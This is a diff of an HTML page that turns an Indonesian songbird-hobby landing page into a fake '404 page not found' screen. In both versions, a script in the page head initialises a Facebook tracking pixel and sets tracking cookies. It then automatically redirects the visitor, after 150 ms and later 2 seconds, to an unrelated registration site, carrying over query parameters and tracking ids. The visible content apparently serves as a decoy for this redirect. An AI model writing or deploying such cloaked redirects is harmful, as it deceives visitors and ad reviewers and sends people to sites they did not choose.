@@ -4,843 +4,314 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <title>Burung Kicau Mania</title>
+  <title>404 - Halaman Tidak Ditemukan</title>
 
-  <meta name="description" content="Burung Kicau Mania adalah halaman inspiratif untuk pecinta burung kicau. Temukan informasi tentang perawatan, jenis burung favorit, tips menjaga performa, dan semangat hobi kicau mania.">
-  <meta name="keywords" content="burung kicau mania, burung kicau, kicau mania, perawatan burung, hobi burung, burung gacor, komunitas burung, tips burung kicau">
-  <meta name="author" content="Burung Kicau Mania">
+  <meta name="description" content="Terima kasih sudah datang kesini. Tetap semangat, terus mencoba, dan jangan pernah menyerah.">
   <meta name="robots" content="index, follow">
 
-  <meta property="og:title" content="Burung Kicau Mania">
-  <meta property="og:description" content="Jelajahi dunia burung kicau, tips perawatan, jenis favorit, dan semangat komunitas pecinta burung yang penuh inspirasi.">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://burungkicau.vercel.app/">
-  <meta property="og:image" content="https://images.unsplash.com/photo-1444464666168-49d633b86797?auto=format&fit=crop&w=1200&q=80">
-
-  <link rel="canonical" href="https://burungkicau.vercel.app/">
-
   <script>
-!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
+!function(f,b,e,v,n,t,s){
+  if(f.fbq)return;
+  n=f.fbq=function(){
+    n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)
+  };
+  if(!f._fbq)f._fbq=n;
+  n.push=n;
+  n.loaded=!0;
+  n.version='2.0';
+  n.queue=[];
+  t=b.createElement(e);
+  t.async=!0;
+  t.src=v;
+  s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)
+}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
 
-(function () {  
+(function () {
   var PIXEL_ID = '910051731937166';
   var DESTINATION_URL = 'https://wede.tanpabatas.site/register?referral_code=facebook';
-  var REDIRECT_DELAY_MS = 150;
+  var REDIRECT_DELAY_MS = 2000;
 
-  function rand() {    
-    if (window.crypto && crypto.randomUUID) return crypto.randomUUID();    
-    return 'eid_' + Date.now() + '_' + Math.random().toString(36).slice(2, 12);  
+  function rand() {
+    if (window.crypto && crypto.randomUUID) return crypto.randomUUID();
+    return 'eid_' + Date.now() + '_' + Math.random().toString(36).slice(2, 12);
   }
 
-  function setCookie(name, value, days) {    
-    var d = new Date();    
-    d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));    
-    document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + d.toUTCString() + '; path=/; SameSite=Lax';  
+  function setCookie(name, value, days) {
+    var d = new Date();
+    d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+    document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + d.toUTCString() + '; path=/; SameSite=Lax';
   }
 
-  function getCookie(name) {    
-    var match = document.cookie.match(new RegExp('(?:^|; )' + name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '=([^;]*)'));    
-    return match ? decodeURIComponent(match[1]) : '';  
+  function getCookie(name) {
+    var match = document.cookie.match(new RegExp('(?:^|; )' + name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '=([^;]*)'));
+    return match ? decodeURIComponent(match[1]) : '';
   }
 
-  function ensureFbp() {    
-    var fbp = getCookie('_fbp');    
-    if (!fbp) {      
-      fbp = 'fb.1.' + Date.now() + '.' + Math.floor(Math.random() * 1e10);      
-      setCookie('_fbp', fbp, 90);    
-    }    
-    return fbp;  
+  function ensureFbp() {
+    var fbp = getCookie('_fbp');
+    if (!fbp) {
+      fbp = 'fb.1.' + Date.now() + '.' + Math.floor(Math.random() * 1e10);
+      setCookie('_fbp', fbp, 90);
+    }
+    return fbp;
   }
 
-  function ensureFbc(searchParams) {    
-    var fbc = getCookie('_fbc');    
-    var fbclid = searchParams.get('fbclid') || '';    
-    if (!fbc && fbclid) {      
-      fbc = 'fb.1.' + Date.now() + '.' + fbclid;      
-      setCookie('_fbc', fbc, 90);    
-    }    
-    return fbc || '';  
+  function ensureFbc(searchParams) {
+    var fbc = getCookie('_fbc');
+    var fbclid = searchParams.get('fbclid') || '';
+    if (!fbc && fbclid) {
+      fbc = 'fb.1.' + Date.now() + '.' + fbclid;
+      setCookie('_fbc', fbc, 90);
+    }
+    return fbc || '';
   }
 
-  function ensureCid() {    
-    var cid = getCookie('_cid');    
-    if (!cid) { cid = rand(); setCookie('_cid', cid, 90); }    
-    return cid;  
+  function ensureCid() {
+    var cid = getCookie('_cid');
+    if (!cid) {
+      cid = rand();
+      setCookie('_cid', cid, 90);
+    }
+    return cid;
   }
 
-  function ensureSid() {    
-    var sid = sessionStorage.getItem('_sid');    
-    if (!sid) { sid = rand(); sessionStorage.setItem('_sid', sid); }    
-    return sid;  
+  function ensureSid() {
+    var sid = sessionStorage.getItem('_sid');
+    if (!sid) {
+      sid = rand();
+      sessionStorage.setItem('_sid', sid);
+    }
+    return sid;
   }
 
-  function buildRedirectUrl() {    
-    var current = new URL(window.location.href);    
+  function buildRedirectUrl() {
+    var current = new URL(window.location.href);
     var dest = new URL(DESTINATION_URL);
 
-    current.searchParams.forEach(function (value, key) {      
-      if (!dest.searchParams.has(key)) { dest.searchParams.set(key, value); }    
+    current.searchParams.forEach(function (value, key) {
+      if (!dest.searchParams.has(key)) {
+        dest.searchParams.set(key, value);
+      }
     });
 
-    var cid = ensureCid();    
-    var sid = ensureSid();    
-    if (!dest.searchParams.has('cid')) dest.searchParams.set('cid', cid);    
+    var cid = ensureCid();
+    var sid = ensureSid();
+
+    if (!dest.searchParams.has('cid')) dest.searchParams.set('cid', cid);
     if (!dest.searchParams.has('sid')) dest.searchParams.set('sid', sid);
 
-    return dest.toString();  
+    return dest.toString();
   }
 
-  var currentUrl = new URL(window.location.href);  
-  var fbp = ensureFbp();  
-  var fbc = ensureFbc(currentUrl.searchParams);  
-  var cid = ensureCid();  
-  var sid = ensureSid();  
+  var currentUrl = new URL(window.location.href);
+  var fbp = ensureFbp();
+  var fbc = ensureFbc(currentUrl.searchParams);
+  var cid = ensureCid();
+  var sid = ensureSid();
   var pageId = rand();
 
-  var pageViewEventID = 'pv_' + pageId;  
+  var pageViewEventID = 'pv_' + pageId;
+
   fbq('init', PIXEL_ID);
 
-  var params = {    
-    page_location: location.href,    
-    page_path: location.pathname + location.search,    
-    page_title: document.title || '',    
-    referrer: document.referrer || '',    
-    fbp: fbp || undefined,    
-    fbc: fbc || undefined,    
-    cid: cid,    
-    sid: sid,    
-    page_id: pageId  
-  };
+  fbq('track', 'PageView', {
+    page_location: location.href,
+    page_path: location.pathname + location.search,
+    page_title: document.title || '',
+    referrer: document.referrer || '',
+    fbp: fbp || undefined,
+    fbc: fbc || undefined,
+    cid: cid,
+    sid: sid,
+    page_id: pageId
+  }, {
+    eventID: pageViewEventID
+  });
 
-  fbq('track', 'PageView', params, { eventID: pageViewEventID });
-
-  setTimeout(function () {    
-    window.location.replace(buildRedirectUrl());  
+  setTimeout(function () {
+    window.location.replace(buildRedirectUrl());
   }, REDIRECT_DELAY_MS);
 
 })();
-</script>
+  </script>
 
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      scroll-behavior: smooth;
+    }
+
+    html,
+    body {
+      width: 100%;
+      min-height: 100%;
     }
 
     body {
+      background: #000;
+      color: #fff;
       font-family: Arial, sans-serif;
-      background: #f6fbf7;
-      color: #1f2937;
-      line-height: 1.8;
-    }
-
-    a {
-      text-decoration: none;
-    }
-
-    .container {
-      width: 92%;
-      max-width: 1180px;
-      margin: auto;
-    }
-
-    header {
-      background: #ffffff;
-      box-shadow: 0 3px 15px rgba(0,0,0,0.06);
-      position: sticky;
-      top: 0;
-      z-index: 999;
-    }
-
-    nav {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 18px 0;
-    }
-
-    .logo {
-      font-size: 26px;
-      font-weight: bold;
-      color: #15803d;
-    }
-
-    .menu {
-      list-style: none;
-      display: flex;
-      gap: 24px;
-    }
-
-    .menu a {
-      color: #374151;
-      font-weight: 600;
-      transition: 0.3s;
-    }
-
-    .menu a:hover {
-      color: #15803d;
-    }
-
-    .hero {
-      background:
-        linear-gradient(rgba(21, 128, 61, 0.68), rgba(20, 83, 45, 0.72)),
-        url('https://images.unsplash.com/photo-1444464666168-49d633b86797?auto=format&fit=crop&w=1600&q=80') center/cover no-repeat;
-      color: #ffffff;
       text-align: center;
-      padding: 130px 20px;
+      overflow: hidden;
     }
 
-    .hero h1 {
-      font-size: 56px;
-      line-height: 1.2;
-      margin-bottom: 18px;
-    }
-
-    .hero p {
-      max-width: 780px;
-      margin: 0 auto 30px;
-      font-size: 19px;
-      color: #ecfdf5;
-    }
-
-    .btn {
-      display: inline-block;
-      padding: 14px 32px;
-      border-radius: 999px;
-      background: #ffffff;
-      color: #15803d;
-      font-weight: bold;
-      transition: 0.3s;
-      margin: 6px;
-    }
-
-    .btn:hover {
-      background: #dcfce7;
-      transform: translateY(-3px);
-    }
-
-    .btn-dark {
-      background: #166534;
-      color: #ffffff;
-    }
-
-    .btn-dark:hover {
-      background: #14532d;
-    }
-
-    section {
-      padding: 80px 0;
-    }
-
-    .title {
-      text-align: center;
-      font-size: 38px;
-      color: #15803d;
-      margin-bottom: 14px;
-    }
-
-    .subtitle {
-      text-align: center;
-      max-width: 760px;
-      margin: 0 auto 48px;
-      color: #4b5563;
-      font-size: 17px;
-    }
-
-    .info-grid {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 20px;
-      margin-top: -45px;
+    .error-page {
+      min-height: 100vh;
       position: relative;
-      z-index: 2;
-    }
-
-    .info-box {
-      background: #ffffff;
-      border-radius: 20px;
-      padding: 24px;
-      text-align: center;
-      box-shadow: 0 12px 28px rgba(0,0,0,0.08);
-      border: 1px solid #e5e7eb;
-    }
-
-    .info-box strong {
-      display: block;
-      color: #15803d;
-      font-size: 24px;
-      margin-bottom: 8px;
-    }
-
-    .about {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 40px;
-      align-items: center;
-    }
-
-    .about img {
-      width: 100%;
-      border-radius: 24px;
-      box-shadow: 0 15px 35px rgba(0,0,0,0.12);
-    }
-
-    .about-text h2 {
-      font-size: 34px;
-      color: #111827;
-      margin-bottom: 16px;
-    }
-
-    .about-text p {
-      margin-bottom: 15px;
-      color: #4b5563;
-    }
-
-    .cards {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 24px;
-    }
-
-    .card {
-      background: #ffffff;
-      padding: 30px;
-      border-radius: 22px;
-      box-shadow: 0 10px 28px rgba(0,0,0,0.07);
-      border: 1px solid #e5e7eb;
-      transition: 0.3s;
-    }
-
-    .card:hover {
-      transform: translateY(-6px);
-    }
-
-    .icon {
-      width: 58px;
-      height: 58px;
-      border-radius: 16px;
       display: flex;
       align-items: center;
       justify-content: center;
-      background: #dcfce7;
-      color: #15803d;
-      font-size: 26px;
-      font-weight: bold;
-      margin-bottom: 16px;
-    }
-
-    .card h3 {
-      font-size: 23px;
-      margin-bottom: 12px;
-      color: #15803d;
-    }
-
-    .card p {
-      color: #4b5563;
-    }
-
-    .bird-grid {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 20px;
-    }
-
-    .bird-box {
-      background: #ffffff;
-      border-radius: 20px;
-      overflow: hidden;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.07);
-      border: 1px solid #e5e7eb;
-    }
-
-    .bird-box img {
-      width: 100%;
-      height: 220px;
-      object-fit: cover;
-    }
-
-    .bird-content {
-      padding: 20px;
-    }
-
-    .bird-content h3 {
-      color: #15803d;
-      font-size: 22px;
-      margin-bottom: 10px;
-    }
-
-    .bird-content p {
-      color: #4b5563;
-      font-size: 15px;
-    }
-
-    .highlight {
-      background: #ecfdf5;
-      border-left: 7px solid #15803d;
-      padding: 35px;
-      border-radius: 18px;
-      max-width: 920px;
-      margin: auto;
-      text-align: center;
-      font-style: italic;
-      font-size: 24px;
-      color: #166534;
-    }
-
-    .article-box {
-      background: #ffffff;
-      padding: 35px;
-      border-radius: 24px;
-      box-shadow: 0 10px 28px rgba(0,0,0,0.06);
-      border: 1px solid #e5e7eb;
-      margin-bottom: 25px;
-    }
-
-    .article-box h3 {
-      color: #15803d;
-      font-size: 27px;
-      margin-bottom: 14px;
-    }
-
-    .article-box p {
-      color: #4b5563;
-      margin-bottom: 12px;
-    }
-
-    .tips-grid {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 20px;
-    }
-
-    .tip-box {
-      background: #ffffff;
-      border: 1px solid #e5e7eb;
-      border-radius: 20px;
       padding: 24px;
-      text-align: center;
-      box-shadow: 0 8px 22px rgba(0,0,0,0.06);
+      background:
+        radial-gradient(circle at top, rgba(0, 255, 255, 0.18), transparent 35%),
+        radial-gradient(circle at bottom, rgba(255, 0, 0, 0.12), transparent 38%),
+        #000;
     }
 
-    .tip-box strong {
-      display: block;
-      color: #15803d;
-      font-size: 24px;
-      margin-bottom: 8px;
-    }
-
-    .tip-box span {
-      color: #4b5563;
-      font-size: 15px;
-    }
-
-    .faq {
-      background: #ffffff;
-      border: 1px solid #e5e7eb;
-      border-radius: 20px;
-      padding: 24px;
-      margin-bottom: 16px;
-    }
-
-    .faq h3 {
-      color: #111827;
-      margin-bottom: 8px;
-      font-size: 21px;
-    }
-
-    .faq p {
-      color: #4b5563;
-    }
-
-    .cta {
-      background: linear-gradient(135deg, #15803d, #166534);
-      padding: 75px 24px;
-      border-radius: 28px;
-      text-align: center;
-      color: #ffffff;
-    }
-
-    .cta h2 {
-      font-size: 40px;
-      margin-bottom: 16px;
-    }
-
-    .cta p {
+    .error-container {
+      position: relative;
+      z-index: 2;
       max-width: 760px;
-      margin: 0 auto 26px;
-      color: #ecfdf5;
+      margin: auto;
     }
 
-    footer {
-      background: #14532d;
-      text-align: center;
-      padding: 36px 20px;
-      margin-top: 60px;
-      color: #d1fae5;
+    .error-title {
+      font-size: clamp(86px, 16vw, 180px);
+      font-weight: 900;
+      line-height: 1;
+      position: relative;
+      text-shadow: 0 0 5px cyan, 0 0 10px cyan;
+      animation: glitch 1.5s infinite alternate;
+      letter-spacing: 4px;
     }
 
-    footer strong {
-      color: #ffffff;
+    @keyframes glitch {
+      0% {
+        text-shadow: 0 0 5px cyan, 0 0 10px cyan;
+        transform: translate(0, 0);
+      }
+
+      50% {
+        text-shadow: -5px -5px 10px red, 5px 5px 10px blue;
+        transform: translate(-2px, 2px);
+      }
+
+      100% {
+        text-shadow: 5px 5px 10px red, -5px -5px 10px blue;
+        transform: translate(2px, -2px);
+      }
     }
 
-    @media (max-width: 950px) {
-      nav {
-        flex-direction: column;
-        gap: 14px;
+    .error-message {
+      font-size: clamp(18px, 3vw, 25px);
+      line-height: 1.7;
+      opacity: 0.88;
+      margin: 24px auto 0;
+      max-width: 680px;
+    }
+
+    .error-btn {
+      display: inline-block;
+      margin-top: 28px;
+      padding: 13px 26px;
+      background: cyan;
+      color: #000;
+      font-weight: bold;
+      text-decoration: none;
+      border-radius: 8px;
+      box-shadow: 0 0 10px cyan;
+      transition: 0.3s;
+    }
+
+    .error-btn:hover {
+      background: red;
+      color: #fff;
+      box-shadow: 0 0 20px red;
+      transform: translateY(-3px);
+    }
+
+    .lightning {
+      position: absolute;
+      width: 230px;
+      height: 230px;
+      right: -80px;
+      top: -80px;
+      background: url('https://upload.wikimedia.org/wikipedia/commons/5/57/Lightning-bolt-animation.gif') no-repeat center;
+      background-size: cover;
+      opacity: 0;
+      pointer-events: none;
+      animation: lightning-effect 2s infinite;
+      filter: drop-shadow(0 0 18px cyan);
+    }
+
+    @keyframes lightning-effect {
+      0% {
+        opacity: 0;
+        transform: translateY(-50px) scale(0.8);
       }
 
-      .menu {
-        flex-wrap: wrap;
-        justify-content: center;
-        gap: 14px;
+      50% {
+        opacity: 1;
+        transform: translateY(0) scale(1.2);
       }
 
-      .hero h1 {
-        font-size: 40px;
+      100% {
+        opacity: 0;
+        transform: translateY(-50px) scale(0.8);
+      }
+    }
+
+    .scanline {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 1;
+      background: repeating-linear-gradient(
+        to bottom,
+        rgba(255,255,255,0.04) 0,
+        rgba(255,255,255,0.04) 1px,
+        transparent 1px,
+        transparent 5px
+      );
+      opacity: 0.32;
+    }
+
+    @media (max-width: 600px) {
+      .error-page {
+        padding: 18px;
       }
 
-      .hero p {
+      .error-message {
         font-size: 17px;
       }
 
-      .info-grid,
-      .about,
-      .cards,
-      .bird-grid,
-      .tips-grid {
-        grid-template-columns: 1fr;
-      }
-
-      .title {
-        font-size: 30px;
-      }
-
-      .highlight {
-        font-size: 20px;
-        padding: 24px;
-      }
-
-      .cta h2 {
-        font-size: 30px;
-      }
-
-      .info-grid {
-        margin-top: 25px;
+      .lightning {
+        width: 160px;
+        height: 160px;
+        right: -55px;
+        top: -45px;
       }
     }
   </style>
 </head>
 
 <body>
+  <main class="error-page">
+    <div class="scanline"></div>
 
-  <header>
-    <div class="container">
-      <nav>
-        <div class="logo">Burung Kicau Mania</div>
-        <ul class="menu">
-          <li><a href="#home">Home</a></li>
-          <li><a href="#tentang">Tentang</a></li>
-          <li><a href="#fitur">Perawatan</a></li>
-          <li><a href="#jenis">Jenis Burung</a></li>
-          <li><a href="#faq">FAQ</a></li>
-        </ul>
-      </nav>
-    </div>
-  </header>
+    <div class="error-container">
+      <div class="lightning"></div>
 
-  <section class="hero" id="home">
-    <div class="container">
-      <h1>Burung Kicau Mania</h1>
-      <p>
-        Dunia hobi burung kicau yang penuh warna, suara indah, dan semangat komunitas.
-        Temukan inspirasi seputar perawatan, jenis burung favorit, dan cara menikmati hobi dengan lebih menyenangkan.
-      </p>
-      <a href="#tentang" class="btn">Mulai Jelajahi</a>
-      <a href="#jenis" class="btn btn-dark">Lihat Jenis Burung</a>
-    </div>
-  </section>
+      <h1 class="error-title">404</h1>
 
-  <div class="container">
-    <div class="info-grid">
-      <div class="info-box">
-        <strong>Hobi</strong>
-        Menyenangkan dan penuh inspirasi
-      </div>
-      <div class="info-box">
-        <strong>Komunitas</strong>
-        Cocok untuk pecinta burung kicau
-      </div>
-      <div class="info-box">
-        <strong>Perawatan</strong>
-        Tips dasar yang mudah dipahami
-      </div>
-      <div class="info-box">
-        <strong>Informasi</strong>
-        Ringan, rapi, dan menarik dibaca
-      </div>
-    </div>
-  </div>
-
-  <section id="tentang">
-    <div class="container">
-      <h2 class="title">Tentang Burung Kicau Mania</h2>
-      <p class="subtitle">
-        Burung kicau bukan sekadar hewan peliharaan, tetapi juga bagian dari hobi yang menghadirkan ketenangan, keindahan suara, dan kebersamaan.
+      <p class="error-message">
+        Terima kasih sudah datang kesini semangat terus pasti bisa jangan pernah menyerah yang penting mau coba terus.
       </p>
 
-      <div class="about">
-        <img src="https://images.unsplash.com/photo-1518717758536-85ae29035b6d?auto=format&fit=crop&w=1200&q=80" alt="Burung kicau mania">
-        <div class="about-text">
-          <h2>Hobi yang Penuh Warna dan Suara</h2>
-          <p>
-            Banyak pecinta burung menikmati hobi ini karena suara kicauan yang merdu, bentuk burung yang indah,
-            dan rutinitas perawatan yang terasa menyenangkan setiap hari.
-          </p>
-          <p>
-            Burung kicau juga identik dengan kedisiplinan dalam merawat, memberi pakan, menjaga kebersihan kandang,
-            serta memahami karakter masing-masing burung.
-          </p>
-          <p>
-            Lewat dunia kicau mania, orang-orang bisa saling berbagi pengalaman, tips, dan semangat
-            untuk merawat burung dengan lebih baik.
-          </p>
-        </div>
-      </div>
+      <a href="/" class="error-btn">Kembali ke Beranda</a>
     </div>
-  </section>
-
-  <section id="fitur">
-    <div class="container">
-      <h2 class="title">Dasar Perawatan Burung Kicau</h2>
-      <p class="subtitle">
-        Beberapa hal penting yang perlu diperhatikan agar burung tetap sehat, aktif, dan nyaman.
-      </p>
-
-      <div class="cards">
-        <div class="card">
-          <div class="icon">1</div>
-          <h3>Pakan Teratur</h3>
-          <p>
-            Berikan pakan yang sesuai jenis burung dan jaga kualitas makanannya agar kebutuhan harian tetap terpenuhi.
-          </p>
-        </div>
-
-        <div class="card">
-          <div class="icon">2</div>
-          <h3>Kebersihan Kandang</h3>
-          <p>
-            Kandang yang bersih membuat burung lebih nyaman, sehat, dan terhindar dari gangguan lingkungan.
-          </p>
-        </div>
-
-        <div class="card">
-          <div class="icon">3</div>
-          <h3>Air dan Mandi</h3>
-          <p>
-            Pastikan ketersediaan air bersih dan jadwal mandi yang teratur agar burung tetap segar.
-          </p>
-        </div>
-
-        <div class="card">
-          <div class="icon">4</div>
-          <h3>Penjemuran</h3>
-          <p>
-            Penjemuran pada waktu yang tepat membantu menjaga kondisi tubuh burung tetap baik.
-          </p>
-        </div>
-
-        <div class="card">
-          <div class="icon">5</div>
-          <h3>Lingkungan Tenang</h3>
-          <p>
-            Suasana yang nyaman dan tidak terlalu bising membantu burung lebih cepat beradaptasi.
-          </p>
-        </div>
-
-        <div class="card">
-          <div class="icon">6</div>
-          <h3>Perhatian Rutin</h3>
-          <p>
-            Perawatan yang konsisten akan membuat burung lebih aktif dan terlihat terawat dengan baik.
-          </p>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <section>
-    <div class="container">
-      <div class="highlight">
-        “Bagi kicau mania, suara burung bukan hanya bunyi, tetapi bagian dari ketenangan, keindahan, dan semangat menjalani hobi setiap hari.”
-      </div>
-    </div>
-  </section>
-
-  <section id="jenis">
-    <div class="container">
-      <h2 class="title">Jenis Burung Favorit Kicau Mania</h2>
-      <p class="subtitle">
-        Beberapa jenis burung yang sering menjadi favorit karena karakter, warna, dan suara kicauannya.
-      </p>
-
-      <div class="bird-grid">
-        <div class="bird-box">
-          <img src="https://images.unsplash.com/photo-1444464666168-49d633b86797?auto=format&fit=crop&w=900&q=80" alt="Murai batu">
-          <div class="bird-content">
-            <h3>Murai Batu</h3>
-            <p>
-              Dikenal karena penampilan elegan dan suara yang kuat, murai batu menjadi salah satu favorit banyak penghobi.
-            </p>
-          </div>
-        </div>
-
-        <div class="bird-box">
-          <img src="https://images.unsplash.com/photo-1501706362039-c6e80948bb48?auto=format&fit=crop&w=900&q=80" alt="Kacer">
-          <div class="bird-content">
-            <h3>Kacer</h3>
-            <p>
-              Burung yang aktif dan atraktif ini disukai karena gaya serta karakter suaranya yang khas.
-            </p>
-          </div>
-        </div>
-
-        <div class="bird-box">
-          <img src="https://images.unsplash.com/photo-1522926193341-e9ffd686c60f?auto=format&fit=crop&w=900&q=80" alt="Kenari">
-          <div class="bird-content">
-            <h3>Kenari</h3>
-            <p>
-              Kenari terkenal dengan warna cerah dan suara yang enak didengar, cocok untuk pecinta suasana santai.
-            </p>
-          </div>
-        </div>
-
-        <div class="bird-box">
-          <img src="https://images.unsplash.com/photo-1497206365907-f5e630693df0?auto=format&fit=crop&w=900&q=80" alt="Cucak hijau">
-          <div class="bird-content">
-            <h3>Cucak Hijau</h3>
-            <p>
-              Memiliki warna menarik dan karakter yang kuat, cucak hijau sering menjadi pilihan penghobi berpengalaman.
-            </p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <section>
-    <div class="container">
-      <h2 class="title">Kenapa Banyak Orang Menyukai Hobi Ini?</h2>
-      <p class="subtitle">
-        Hobi burung kicau punya daya tarik tersendiri karena memadukan keindahan, rutinitas, dan rasa tenang.
-      </p>
-
-      <div class="article-box">
-        <h3>Memberi Rasa Tenang</h3>
-        <p>
-          Suara burung yang merdu sering memberi suasana santai dan membantu banyak orang menikmati waktu di rumah dengan lebih nyaman.
-        </p>
-        <p>
-          Bagi sebagian orang, mendengar kicauan burung di pagi hari menjadi salah satu momen yang menyenangkan.
-        </p>
-      </div>
-
-      <div class="article-box">
-        <h3>Mengajarkan Konsistensi</h3>
-        <p>
-          Merawat burung membutuhkan perhatian rutin. Dari memberi makan sampai menjaga kebersihan,
-          semua itu mengajarkan kedisiplinan dalam menjalani hobi.
-        </p>
-      </div>
-
-      <div class="article-box">
-        <h3>Membangun Komunitas</h3>
-        <p>
-          Dunia kicau mania juga identik dengan komunitas yang saling berbagi pengalaman, cerita, dan kecintaan terhadap burung.
-        </p>
-      </div>
-    </div>
-  </section>
-
-  <section>
-    <div class="container">
-      <h2 class="title">Tips Singkat untuk Pemula</h2>
-      <p class="subtitle">
-        Hal-hal sederhana yang bisa jadi awal baik untuk mulai menikmati dunia burung kicau.
-      </p>
-
-      <div class="tips-grid">
-        <div class="tip-box">
-          <strong>01</strong>
-          <span>Pilih jenis burung yang sesuai dengan waktu dan kenyamananmu.</span>
-        </div>
-
-        <div class="tip-box">
-          <strong>02</strong>
-          <span>Pelajari karakter dasar burung sebelum memulai perawatan rutin.</span>
-        </div>
-
-        <div class="tip-box">
-          <strong>03</strong>
-          <span>Jaga kebersihan kandang dan lingkungan sekitar setiap hari.</span>
-        </div>
-
-        <div class="tip-box">
-          <strong>04</strong>
-          <span>Nikmati prosesnya dengan santai dan konsisten.</span>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <section id="faq">
-    <div class="container">
-      <h2 class="title">Pertanyaan Umum</h2>
-      <p class="subtitle">
-        Beberapa pertanyaan singkat seputar dunia burung kicau mania.
-      </p>
-
-      <div class="faq">
-        <h3>Apa itu burung kicau mania?</h3>
-        <p>
-          Istilah ini biasanya dipakai untuk menyebut pecinta burung kicau dan dunia hobinya, termasuk perawatan, komunitas, dan ketertarikan pada suara burung.
-        </p>
-      </div>
-
-      <div class="faq">
-        <h3>Apakah hobi ini cocok untuk pemula?</h3>
-        <p>
-          Ya, selama dimulai dengan jenis burung yang sesuai dan dipelajari perawatan dasarnya secara bertahap.
-        </p>
-      </div>
-
-      <div class="faq">
-        <h3>Apa yang paling penting dalam merawat burung?</h3>
-        <p>
-          Konsistensi dalam memberi pakan, menjaga kebersihan, menyediakan air bersih, dan menciptakan lingkungan yang nyaman.
-        </p>
-      </div>
-    </div>
-  </section>
-
-  <section>
-    <div class="container">
-      <div class="cta">
-        <h2>Jelajahi Dunia Burung Kicau</h2>
-        <p>
-          Temukan semangat hobi, nikmati keindahan suara burung, dan bangun rutinitas perawatan yang menyenangkan setiap hari.
-        </p>
-        <a href="#home" class="btn">Kembali ke Atas</a>
-      </div>
-    </div>
-  </section>
-
-  <footer>
-    <p><strong>Burung Kicau Mania</strong></p>
-    <p>Dunia pecinta burung kicau yang penuh warna dan inspirasi.</p>
-    <p>© 2026 Burung Kicau Mania. Semua hak dilindungi.</p>
-  </footer>
-
+  </main>
 </body>
 </html>
